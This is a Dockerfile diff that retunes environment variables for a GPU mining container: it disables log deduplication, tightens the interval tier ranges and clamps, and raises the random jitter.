@@ -139,7 +139,7 @@ ENV SCRIPT_DIR=/app/mining_environment/scripts \
 
 # Feature flags for GPU optimization and logging (cờ tính năng – đặt mặc định cho container)
 ENV ENABLE_DYNAMIC_BALANCING=true \
-    ENABLE_LOG_DEDUP=true \
+    ENABLE_LOG_DEDUP=0 \
     ENABLE_DAG_SYNC=true
 
 # ------------------  GPU OPTIMIZATION SETTINGS (No Plugins) ------------------
@@ -182,15 +182,15 @@ ENV CONTINUOUS_OPT_INTERVAL_SEC=30
 ENV CONTINUOUS_OPT_MODE=adaptive
 
 # ===== Dải bậc mặc định (tier mapping) =====
-# 0: 300–600, 1: 600–1200, 2: 1200–1800, 3: 1800–3600, 4: 3600–7200
-ENV INTERVAL_CHOICES_JSON=[[300,600],[600,1200],[1200,1800],[1800,3600],[3600,7200]]
+# Final recommended: 0: 240–420, 1: 420–900, 2: 900–1500, 3: 1500–2400, 4: 2400–4200
+ENV INTERVAL_CHOICES_JSON=[[240,420],[420,900],[900,1500],[1500,2400],[2400,4200]]
 
-# ===== Giới hạn bậc (kẹp min/max). Để trống = không kẹp =====
-ENV INTERVAL_MIN_TIER=
-ENV INTERVAL_MAX_TIER=
+# ===== Giới hạn bậc (kẹp min/max). Phương án cuối: MIN=0, MAX=3 =====
+ENV INTERVAL_MIN_TIER=0
+ENV INTERVAL_MAX_TIER=3
 
 # ===== Random jitter (nhiễu ngẫu nhiên – giảm đồng pha) =====
-ENV INTERVAL_JITTER_PCT=0.15
+ENV INTERVAL_JITTER_PCT=0.22
 
 
 # ===== Per-tier overrides (tùy chọn) =====
